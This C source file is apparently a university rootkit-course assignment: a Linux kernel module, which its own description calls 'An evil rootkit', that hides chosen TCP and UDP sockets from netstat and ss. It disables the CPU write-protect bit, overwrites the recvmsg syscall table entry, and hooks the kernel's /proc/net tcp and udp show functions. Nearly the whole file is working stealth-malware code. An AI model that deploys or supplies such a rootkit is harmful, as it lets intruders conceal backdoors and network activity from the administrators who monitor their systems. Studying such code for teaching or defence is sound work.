
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: This module is hiding sockets from user land tools. The sockets    */
/*          that are to be hidden should be specified by passing the ports to  */
/*          as system arguments when loading the module. This module supports  */
/*          UDP and TCP as protocols (for both IPv4 and IPv6 connections) and  */
/*          all ports in both (incoming and outgoing) directions. Sockets are  */
/*          hidden from system tools like `netstat` and `ss`.                  */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
#include <linux/inet_diag.h>	/* Needed for ntohs */
#include <net/tcp.h>			/* Needed for struct tcp_seq_afinfo */
#include <net/udp.h>			/* Needed for struct udp_seq_afinfo */

#include "socket_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("An evil rootkit. It masks designated sockets :)");
MODULE_VERSION("0.1");
MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>") ;
MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");

module_param_array(tcp4_ports, int, &tcp4_ports_count, 0);
MODULE_PARM_DESC(tcp4_ports, "TCPv4 ports to be masked");
module_param_array(tcp6_ports, int, &tcp6_ports_count, 0);
MODULE_PARM_DESC(tcp6_ports, "TCPv6 ports to be masked");
module_param_array(udp4_ports, int, &udp4_ports_count, 0);
MODULE_PARM_DESC(udp4_ports, "UDPv4 ports to be masked");
module_param_array(udp6_ports, int, &udp6_ports_count, 0);
MODULE_PARM_DESC(udp6_ports, "UDPv6 ports to be masked");


/* Initialization function which is called when the module is
   insmoded into the kernel. */
static int __init socket_masker_start(void)
{
	if (!tcp4_ports_count && !udp4_ports_count &&
			!tcp6_ports_count && !udp6_ports_count) {
		PRINT("insmod socket_masker.ko [tcp4_ports=port,...]"
			                         " [udp4_ports=port,...]"
									 " [tcp6_ports=port,...]"
									 " [udp6_ports=port,...]");
		/* A non 0 return value means init_module failed; module can't be loaded */
		return -EINVAL;
	}

	if (invalid_ports_found(tcp4_ports, tcp4_ports_count) ||
			invalid_ports_found(tcp6_ports, tcp6_ports_count) ||
			invalid_ports_found(udp4_ports, udp4_ports_count) ||
			invalid_ports_found(udp6_ports, udp6_ports_count)) {

		PRINT("An invalid port was specified. Valid ports belong in the range [0-65535].");
		/* A non 0 return value means init_module failed; module can't be loaded */
		return -EINVAL;
	}

	mask_sockets_from_ss();
	mask_sockets_from_netstat();

	PRINT("successfully inserted");

	return 0;
}


/* Cleanup function which is called just before module is rmmoded. */
static void __exit socket_masker_end(void)
{
	unmask_sockets_from_ss();
	unmask_sockets_from_netstat();

	PRINT("successfully removed");

	return;
}


/* This function checks if the specified ports belong to the valid port range (0-65535) */
static int invalid_ports_found(int *ports, int ports_count)
{
	int i;

	for (i=0 ; i<ports_count ; i++)
		if (ports[i] < 0 || 65535 < ports[i])
			return 1;

	return 0;
}


/* This function masks sockets from the ss system program. The kernel modules `inet_diag`
   and `tcp_diag` are used by the system program `ss` to gather socket information. The
   communication between `ss` and the aforementioned modules is done via a netlink socket.
   Therefore, we hook the system call (specifically `recvmsg`) which does the reading from
   the netlink socket and manipulate the transfered data.  */
static void mask_sockets_from_ss()
{
	disable_write_protect_mode();

	/* Store original `recvmsg` address */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];

	/* Overwrite manipulated `recvmsg` syscall */
	syscall_table[__NR_recvmsg] = (unsigned long *) my_recvmsg_syscall;

	enable_write_protect_mode();
}


/* This function unmasks sockets from the `ss` system
   program. It restores the original `recvmsg` syscall. */
static void unmask_sockets_from_ss(void)
{
	disable_write_protect_mode();

	/* Restore original `recvmsg` syscall */
	syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;

	enable_write_protect_mode();
}


static void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


static void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


/* Function that replaces the original `recvmsg` syscall. Initially, it calls the original
   `recvmsg` which fills the given msg buffer. We realize whether we are reading from a netlink
   socket with the help of some netlink utility macros. If a netlink socket is being used, we
   iterate through the inet diag msg structs (each prepended by a nlmsghdr) and compare the
   source and destination ports with our list of hidden ones. In order to hide an entry we copy
   the remaining entries over it and adjust the data length which is returned to the user. */
asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
{
	long ret;
	struct nlmsghdr *nlh;
	long count;
	int found;
	char *stream;
	int offset;
	int i;

	/* Call original `recvmsg` syscall */
	ret = original_recvmsg_syscall(sockfd, msg, flags);

	/* Some error occured. Don't do anything. */
	if (ret < 0)
		return ret;

	/* Extract netlink message header from message */
	nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);

	/* Number of bytes remaining in message stream */
    count = ret;

	/* Set flag specifying whether message contains data to be masked */
	found = 0;

	/* NLMSG_OK: This macro will return true if a netlink message was received. It
	   essentially checks whether it's safe to parse the netlink message (if indeed
	   is a netlink message) using the other NLMSG_* macros. */
	while (NLMSG_OK(nlh, count)) {

		if (found == 0)
			/* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
			nlh = NLMSG_NEXT(nlh, count);

		if (!data_should_be_masked(nlh)) {
			found = 0;
			continue;
		}

		/* Message contains data to be masked */
		found = 1;

		stream = (char *) nlh;

		/* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
		offset = NLMSG_ALIGN((nlh)->nlmsg_len);

		/* Copy remaining entries over the data to be masked */
		for (i=0 ; i<count ; i++)
			stream[i] = stream[i + offset];

		/* Adjust the data length */
		ret -= offset;
	}

	return ret;
}


/* Function that checks whether specified netlink message contains data to be masked */
static int data_should_be_masked(struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r;
	int port;

	/* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
	r = NLMSG_DATA(nlh);

	/* From the ancilliary data extract the port associated with the socket identity */
	port = ntohs(r->id.idiag_sport);

	if ((tcp4_ports_count && should_mask_socket("tcp4", port)) ||
			(tcp6_ports_count && should_mask_socket("tcp6", port)) ||
			(udp4_ports_count && should_mask_socket("udp4", port)) ||
			(udp6_ports_count && should_mask_socket("udp6", port)))
		return 1;

	return 0;
}


/* This function masks sockets from the netstat system program. The netstat system
   program uses the contents of the files in /proc/tcp and /proc/udp/ to get socket
   information. The files /proc/tcp and /proc/udp are so called sequence files and are
   sequentially filled on request by the corresponding seq functions of tcp and udp. We
   find access to those functions by the proc dir entries of tcp and udp. These entries
   are found in a red black tree rooted by the proc dir entry `net`. Once we find them,
   we retreive their file operations, make a backup of the tcp_seq_show and the
   udp_seq_show functions and replace their pointers by the ones of our custom functions.
   The hooked functions emulate the original ones but return a length of zero if the
   given socket uses a hidden port as source or destination port. */
static void mask_sockets_from_netstat(void)
{
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	/* Get the proc dir entry for /proc/<pid>/net */
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		//PRINT(proc_dir_entryptr->name);

		/* Search for the entries called tcp, tcp6, udp and udp6 */
		if (!strcmp(proc_dir_entryptr->name, "tcp") && tcp4_ports_count) {
			tcp_seq = proc_dir_entryptr->data;
			original_tcp4_show = tcp_seq->seq_ops.show;

			/* Hook the kernel function tcp4_seq_show */
			tcp_seq->seq_ops.show = my_tcp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "tcp6") && tcp6_ports_count) {
			tcp_seq = proc_dir_entryptr->data;
			original_tcp6_show = tcp_seq->seq_ops.show;

			/* Hook the kernel function tcp6_seq_show */
			tcp_seq->seq_ops.show = my_tcp6_show;
		} else if  (!strcmp(proc_dir_entryptr->name, "udp") && udp4_ports_count) {
			udp_seq = proc_dir_entryptr->data;
			original_udp4_show = udp_seq->seq_ops.show;

			/* Hook the kernel function udp4_seq_show */
			udp_seq->seq_ops.show = my_udp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp6") && udp6_ports_count) {
			udp_seq = proc_dir_entryptr->data;
			original_udp6_show = udp_seq->seq_ops.show;

			/* Hook the kernel function udp6_seq_show */
			udp_seq->seq_ops.show = my_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}
}


/* This function unmasks sockets from the `netstat` system program.
   It restores the original tcp_seq_show and udp_seq_show functions. */
static void unmask_sockets_from_netstat(void)
{
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

	proc_rb_root = init_net.proc_net->subdir;
	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		//PRINT(proc_dir_entryptr->name);

		if (!strcmp(proc_dir_entryptr->name, "tcp") && tcp4_ports_count) {
			tcp_seq = proc_dir_entryptr->data;
			tcp_seq->seq_ops.show = original_tcp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "tcp6") && tcp6_ports_count) {
			tcp_seq = proc_dir_entryptr->data;
			tcp_seq->seq_ops.show = original_tcp6_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp") && udp4_ports_count) {
			udp_seq = proc_dir_entryptr->data;
			udp_seq->seq_ops.show = original_udp4_show;
		} else if (!strcmp(proc_dir_entryptr->name, "udp6") && udp6_ports_count) {
			udp_seq = proc_dir_entryptr->data;
			udp_seq->seq_ops.show = original_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}

}


/* The functions below emulate the original seq functions of tcp and udp but return a
   length of zero if the given socket uses a hidden port as source or destination port. */
static int my_tcp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_tcp4_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("tcp4", port))
		return 0;

	return original_tcp4_show(m, v);
}


static int my_tcp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_tcp6_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("tcp6", port))
		return 0;

	return original_tcp6_show(m, v);
}


static int my_udp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_udp4_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("udp4", port))
		return 0;

	return original_udp4_show(m, v);
}


static int my_udp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_udp6_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (should_mask_socket("udp6", port))
		return 0;

	return original_udp6_show(m, v);
}


/* Function that checks whether we need to mask the specified socket */
static int should_mask_socket(char *protocol, int port)
{
	int ports_count = 0;
	int *ports = NULL;
	int i;

	if (!strcmp(protocol, "tcp4")) {
		ports_count = tcp4_ports_count;
		ports = tcp4_ports;
	} else if (!strcmp(protocol, "tcp6")) {
		ports_count = tcp6_ports_count;
		ports = tcp6_ports;
	} else if (!strcmp(protocol, "udp4")) {
		ports_count = udp4_ports_count;
		ports = udp4_ports;
	} else if (!strcmp(protocol, "udp6")) {
		ports_count = udp6_ports_count;
		ports = udp6_ports;
	}

	for (i=0 ; i<ports_count ; i++)
		if (ports[i] == port)
			return 1;

	return 0;
}

module_init(socket_masker_start);
module_exit(socket_masker_end);
